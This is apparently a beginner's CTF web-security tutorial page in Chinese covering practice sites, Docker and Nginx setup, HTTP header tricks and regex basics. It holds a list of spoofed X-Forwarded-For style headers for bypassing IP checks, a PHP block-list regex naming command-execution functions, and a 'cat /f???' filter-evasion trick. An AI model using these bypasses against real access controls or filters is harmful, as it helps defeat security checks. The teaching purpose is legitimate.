<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF·Web基础 | PureStream &amp; Marblue</title><meta name="author" content="Pure Stream"><meta name="copyright" content="Pure Stream"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Welcome to Web!">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF·Web基础">
<meta property="og:url" content="https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/index.html">
<meta property="og:site_name" content="PureStream &amp; Marblue">
<meta property="og:description" content="Welcome to Web!">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://purestream108.github.io/project/img/purestream.jpg">
<meta property="article:published_time" content="2025-05-31T09:21:08.000Z">
<meta property="article:modified_time" content="2025-11-22T11:54:27.154Z">
<meta property="article:author" content="Pure Stream">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Study">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://purestream108.github.io/project/img/purestream.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTF·Web基础",
  "url": "https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/",
  "image": "https://purestream108.github.io/project/img/purestream.jpg",
  "datePublished": "2025-05-31T09:21:08.000Z",
  "dateModified": "2025-11-22T11:54:27.154Z",
  "author": [
    {
      "@type": "Person",
      "name": "Pure Stream",
      "url": "https://PureStream108.github.io/project"
    }
  ]
}</script><link rel="shortcut icon" href="/img/marblue.jpg"><link rel="canonical" href="https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Pure Stream","link":"链接: ","source":"来源: PureStream & Marblue","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF·Web基础',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lazy.gif" data-original="/img/purestream.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw fas fa-heart"></i><span> Animation</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/l1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">PureStream &amp; Marblue</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF·Web基础</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw fas fa-heart"></i><span> Animation</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTF·Web基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-31T09:21:08.000Z" title="发表于 2025-05-31 17:21:08">2025-05-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-22T11:54:27.154Z" title="更新于 2025-11-22 19:54:27">2025-11-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CTF·Web基础（已完结）"><a href="#CTF·Web基础（已完结）" class="headerlink" title="CTF·Web基础（已完结）"></a>CTF·Web基础（已完结）</h1><h2 id="README"><a href="#README" class="headerlink" title="README"></a>README</h2><p>整合作者：Pure Stream</p>
<p>这里是CTF·Web基础，每个篇章前如果有标了引用或者参考的文章，完全可以去看他们的文章，或者也可以看看我整理过后的正文。侵权立删。</p>
<p>本文适合刚入门的小白想全方位了解CTF·Web，并想参加一些CTF的比赛，也可以用于教学。</p>
<p>PS：我记得刚开始确实是基础的，后面自己也想学就加了一大堆更不基础的进去，但反正就这样叫吧（）</p>
<h2 id="刷题网站"><a href="#刷题网站" class="headerlink" title="刷题网站"></a>刷题网站</h2><p><a target="_blank" rel="noopener" href="https://www.polarctf.com/#/page/challenges">https://www.polarctf.com/#/page/challenges</a> POLAR靶场</p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem">题库 | NSSCTF</a> NSS</p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/login?next=%2Fchallenges%3F">BUUCTF在线评测</a> BUU</p>
<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> 攻防世界</p>
<p><a target="_blank" rel="noopener" href="https://yunjing.ichunqiu.com/login">登录</a> 春秋云镜（Web渗透）</p>
<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index">CTFHub</a> CTFhub</p>
<p>….</p>
<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p><a target="_blank" rel="noopener" href="https://x2ct34m-njupt.feishu.cn/wiki/PJZYwJWdWiw5W3kRnrecu3kan4e">‍‍‌‍‍‍⁠‍⁠‍⁠﻿‍‍‬‬‌﻿‌⁠⁠‍‬‍⁠‌⁠‍‬CTF基础工具的安装以及简单应用 - 飞书云文档</a></p>
<h2 id="Docker-Desktop"><a href="#Docker-Desktop" class="headerlink" title="Docker Desktop"></a>Docker Desktop</h2><p>截至2025年7月初</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;debug&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;experimental&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;insecure-registries&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;https://docker.m.daocloud.io&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker.imgdb.de&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker-0.unsee.tech&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker.hlmirror.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://cjie.eu.org&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：     /etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：       /usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：          /usr/lisb64/nginx/modules</span><br><span class="line">应用程序：       /usr/sbin/nginx</span><br><span class="line">程序默认存放位置： /usr/share/nginx/html</span><br><span class="line">日志默认存放位置： /var/log/nginx</span><br></pre></td></tr></table></figure>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>改浏览器信息+改本地地址+改地址+VPN+POST/GET…..</p>
<p><img src="/img/lazy.gif" data-original="w27.png" alt=""></p>
<p><img src="/img/lazy.gif" data-original="w28.png" alt=""></p>
<p>然后如果要求VPN的话就是用<code>Via</code></p>
<p>对于XFF的绕过形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Client-IP:127.0.0.1</span><br><span class="line">Forwarded-For-Ip: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">Forwarded-For: localhost</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">Forwarded: localhost</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">X-Forward-For: 127.0.0.1</span><br><span class="line">X-Forward: 127.0.0.1</span><br><span class="line">X-Forward: localhost</span><br><span class="line">X-Forwarded-By:127.0.0.1</span><br><span class="line">X-Forwarded-By: localhost</span><br><span class="line">X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">X-Forwarded-For-original: localhost</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded-For: localhost</span><br><span class="line">X-Forwarded-Server: 127.0.0.1</span><br><span class="line">X-Forwarded-Server: localhost</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">X-Forwarded: localhost</span><br><span class="line">X-Forwared-Host: 127.0.0.1</span><br><span class="line">X-Forwared-Host: localhost</span><br><span class="line">X-Host: 127.0.0.1</span><br><span class="line">X-Host: localhost</span><br><span class="line">X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Remote-Addr : localhost</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3740">[GDOUCTF 2023]EZ WEB | NSSCTF</a> PUT</p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3408">[MoeCTF 2021]Do you know HTTP | NSSCTF</a></p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]Begin of HTTP">BUUCTF在线评测</a> Begin Of HTTP</p>
<h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h2><p>Robots 协议（Robots Exclusion Protocol，简称 REP 或 robots.txt 协议）是一套<strong>由网站自行制定、搜索引擎自愿遵守</strong>的“君子协定”，用来告诉网络爬虫「哪些网页可以抓、哪些不可以抓」</p>
<p>如果出现在比赛题中：</p>
<p>直接dirsearch扫出来访问，可以看到一些提示或者是Flag</p>
<p>基本都是签到题</p>
<h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><p><a target="_blank" rel="noopener" href="https://regex101.com/">regex101: build, test, and debug regex</a> 测试正则的</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程</a> 参考</p>
<p>介绍常见的正则表达式与语法</p>
<p>(以下一切的语法都可以在上面那个链接做演示)</p>
<p>(Python中想要使用正则需要使用re库)</p>
<h3 id="ABC"><a href="#ABC" class="headerlink" title="[ABC]"></a><strong>[ABC]</strong></h3><p>匹配[…]中的所有字符</p>
<p>例如 <strong>[aeiou]</strong> 匹配字符串 “google runoob taobao” 中所有的 e o u a 字母</p>
<p>然后<strong>[A-Z]</strong>就是匹配A-Z中的所有字母（26个大写字母）</p>
<hr>
<h3 id="ABC-1"><a href="#ABC-1" class="headerlink" title="ABC"></a><sup><a href="#fn_ABC" id="reffn_ABC">ABC</a></sup></h3><p>匹配除了 <strong>[…]</strong> 中字符的所有字符，例如 <strong><sup><a href="#fn_aeiou" id="reffn_aeiou">aeiou</a></sup></strong> 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字符</p>
<hr>
<h3 id=""><a href="#" class="headerlink" title="."></a>.</h3><p>匹配除换行符（\n、\r）之外的任何单个字符，相等于 <strong><sup><a href="#fn_/n/r" id="reffn_/n/r">/n/r</a></sup></strong></p>
<hr>
<h3 id="s-S"><a href="#s-S" class="headerlink" title="[\s\S]"></a>[\s\S]</h3><p>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，不包括换行</p>
<p><strong>空白符的定义</strong></p>
<ul>
<li>在正则表达式中，空白符是用来匹配空格、制表符、换行符等不可见字符的特殊字符类。它包括以下几种常见的空白字符：<ul>
<li>空格（ ）：就是键盘上的空格键所产生的字符，用于分隔单词等</li>
<li>制表符（\t）：用于在文本中进行水平制表对齐，使文本内容在显示或打印时能够整齐排列</li>
<li>换行符（\n）：用于表示一行文本的结束，新的一行的开始。在不同的操作系统中，换行符可能有所不同，例如在 Windows 系统中是 \r\n，在 Unix/Linux 系统中是 \n</li>
<li>换页符（\f）：较少使用，用于将打印机的打印位置移动到下一页的开头</li>
<li>垂直制表符（\v）：也比较少用，用于垂直方向的制表对齐</li>
</ul>
</li>
</ul>
<p><strong>非空白符的定义</strong></p>
<ul>
<li>非空白符是指除空白符之外的所有可见字符，也可以包括一些不可见的控制字符，但不包括空白符所包含的字符。在正则表达式中，可以用 \S 来表示非空白符。例如，正则表达式 \S+ 可以匹配一个或多个非空白符</li>
</ul>
<hr>
<h3 id="w"><a href="#w" class="headerlink" title="\w"></a>\w</h3><p>匹配字母、下划线、数字</p>
<p>相当于 <strong>[A-Za-z0-9_]</strong></p>
<hr>
<h3 id="d"><a href="#d" class="headerlink" title="\d"></a>\d</h3><p>匹配任意一个阿拉伯数字</p>
<p>相当于 <strong>[0-9]</strong></p>
<hr>
<h3 id="i"><a href="#i" class="headerlink" title="/i"></a>/i</h3><p>忽略大小写，就比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|flag|zlib|ftp|system|shell_exec|exec|file_get_contents|proc_open|fopen|fgets|file_put_contents|file|fread|readfile|stream_get_contents|cat|more|tac|\:|\]|\[|\+|\-|\*|\eval|\^|\`|\&quot;|\&lt;|\&gt;|\\|\/|\ssh/i&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这里加了个 <strong>/i</strong>，那你的Php,PhP这种的都会被当作php处理，就防止你进行大小写绕过</p>
<hr>
<h3 id="匹配特殊字符"><a href="#匹配特殊字符" class="headerlink" title="匹配特殊字符 /"></a>匹配特殊字符 /</h3><p>你就在 <strong>/</strong> 后面加你想要过滤的</p>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/php|flag|zlib|ftp|system</span><br></pre></td></tr></table></figure>
<p><strong>|</strong> 作为分隔符</p>
<p>如果想要过滤特别字符，比如 <strong>$</strong>, <em> , <em>*^</em></em></p>
<p>就要在前面加转义符号 <code>\</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\+|\-|\*|\<span class="keyword">eval</span>|\^|\`|\<span class="string">&quot;|\&lt;|\&gt;|\\|\/|</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="限定符号"><a href="#限定符号" class="headerlink" title="限定符号"></a>限定符号</h3><div class="table-container">
<table>
<thead>
<tr>
<th>*</th>
<th>匹配前面的子表达式零次或多次。例如，<strong>zo*</strong> 能匹配 <strong>“z”</strong> 以及 <strong>“zoo”</strong>。<strong>*</strong> 等价于 <strong>{0,}</strong> ，其实就是匹配所以以这个开头的字符串，比如cat /f*</th>
<th>[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=b\">https://www.runoob.com/try/try-regex.php?texts=b\</a></th>
<th>ab\</th>
<th>aab&amp;tips=a*b)</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。例如，<strong>zo+</strong> 能匹配 <strong>“zo”</strong> 以及 “<strong>zoo”</strong>，但不能匹配 <strong>“z”</strong>。<strong>+</strong> 等价于 <strong>{1,}</strong></td>
<td>[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=ab\">https://www.runoob.com/try/try-regex.php?texts=ab\</a></td>
<td>aab\</td>
<td>aaab&amp;tips=a%2Bb)</td>
</tr>
<tr>
<td>?</td>
<td>匹配前面的子表达式零次或一次。例如，<strong>do(es)?</strong> 可以匹配 <strong>“do”</strong> 、 <strong>“does”</strong>、 <strong>“doxy”</strong> 中的 <strong>“do”</strong> 和 <strong>“does”</strong>。<strong>?</strong> 等价于 <strong>{0,1}</strong>，要是知道flag文件长度，你可以直接<strong>cat /f???</strong>，这就相当于<strong>cat /flag</strong>，但绕过了对flag的过滤</td>
<td>[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=color\">https://www.runoob.com/try/try-regex.php?texts=color\</a></td>
<td>colour\</td>
<td>colour123&amp;tips=colou%3Fr)</td>
</tr>
<tr>
<td>{n}</td>
<td>n 是一个非负整数。匹配确定的 <strong>n</strong> 次。例如，<strong>o{2}</strong> 不能匹配 <strong>“Bob”</strong> 中的 <strong>o</strong>，但是能匹配 <strong>“food”</strong> 中的两个 <strong>o</strong></td>
<td>[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=123aac\">https://www.runoob.com/try/try-regex.php?texts=123aac\</a></td>
<td>456abc\</td>
<td>789acc&amp;tips=\d{3})</td>
</tr>
<tr>
<td>{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，<strong>o{2,}</strong> 不能匹配 <strong>“Bob”</strong> 中的 <strong>o</strong>，但能匹配 <strong>“foooood”</strong> 中的所有 <strong>o</strong>。<strong>o{1,}</strong> 等价于 <strong>o+</strong>。<strong>o{0,}</strong> 则等价于 <strong>o*</strong></td>
<td>[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=12aac\">https://www.runoob.com/try/try-regex.php?texts=12aac\</a></td>
<td>3456abc\</td>
<td>789acc&amp;tips=\d{2%2C})</td>
</tr>
<tr>
<td>{n,m}</td>
<td>m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，<strong>o{1,3}</strong> 将匹配 <strong>“fooooood”</strong> 中的前三个 <strong>o</strong>。<strong>o{0,1}</strong> 等价于 <strong>o?</strong>。请注意在逗号和两个数之间不能有空格</td>
</tr>
</tbody>
</table>
</div>
<p>E.g</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]*/</span><br></pre></td></tr></table></figure>
<ol>
<li><code>[1-9]</code>：匹配一个1到9之间的数字，即数字不能以0开头</li>
<li><code>[0-9]*</code>：匹配<strong>0个或多个</strong>0到9之间的数字</li>
</ol>
<p>例如：</p>
<ul>
<li>匹配：<code>1</code>, <code>12</code>, <code>999</code>, <code>1024</code></li>
<li>不匹配：<code>0</code>（以零开头）, <code>012</code>（以零开头）, <code>abc</code>（非数字）</li>
</ul>
<p>如果删去了 *</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]/</span><br></pre></td></tr></table></figure>
<p>就只能匹配两位数字了</p>
<p>当然 <strong>/[0-9]{1,2}/</strong> 也可以匹配两位数字，但是允许01，00，02这种的出现</p>
<p>避免这种情况</p>
<p>改进下，匹配 1~99 的正整数表达式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]?/</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="贪婪匹配和非贪婪匹配"><a href="#贪婪匹配和非贪婪匹配" class="headerlink" title="贪婪匹配和非贪婪匹配"></a>贪婪匹配和非贪婪匹配</h3><p><code>*</code> 和 <code>+</code> 限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个 ? 就可以实现非贪婪或最小匹配</p>
<p>以匹配 HTML 文档为例</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>miHoYo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>贪婪：</strong>下面的表达式匹配从开始小于符号 (&lt;) 到关闭 h1 标记的大于符号 (&gt;) 之间的所有内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;.*&gt;/</span><br></pre></td></tr></table></figure>
<p>会匹配整个 <code>&lt;h1&gt;miHoYo&lt;/h1&gt;</code></p>
<p><strong>非贪婪：</strong>如果您只需要匹配开始和结束 h1 标签，下面的非贪婪表达式只匹配 <code>&lt;h1&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;.*?&gt;/</span><br></pre></td></tr></table></figure>
<p>只会匹配到 <code>&lt;h1&gt;</code></p>
<p>通过在 <strong>*</strong>、<strong>+</strong> 或 <strong>?</strong> 限定符之后放置 <strong>?</strong>，该表达式从”贪婪”表达式转换为”非贪婪”表达式或者最小匹配</p>
<hr>
<h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><p>定位符使您能够将正则表达式固定到行首或行尾</p>
<p>定位符用来描述字符串或单词的边界，<strong>^</strong> 和 <strong>$</strong> 分别指字符串的开始与结束，<strong>\b</strong> 描述单词的前或后边界，<strong>\B</strong> 表示非单词边界</p>
<p>正则表达式的定位符有：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">字符</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">实例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">^</td>
<td style="text-align:left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配</td>
<td style="text-align:left">[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=Aaa\">https://www.runoob.com/try/try-regex.php?texts=Aaa\</a></td>
<td>Abb\</td>
<td>Acc&amp;tips=^A)</td>
</tr>
<tr>
<td style="text-align:left">$</td>
<td style="text-align:left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配</td>
<td style="text-align:left">[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=aaRUNOOB\">https://www.runoob.com/try/try-regex.php?texts=aaRUNOOB\</a></td>
<td>bbRUNOOB\</td>
<td>ccRUNOOB&amp;tips=RUNOOB$)</td>
</tr>
<tr>
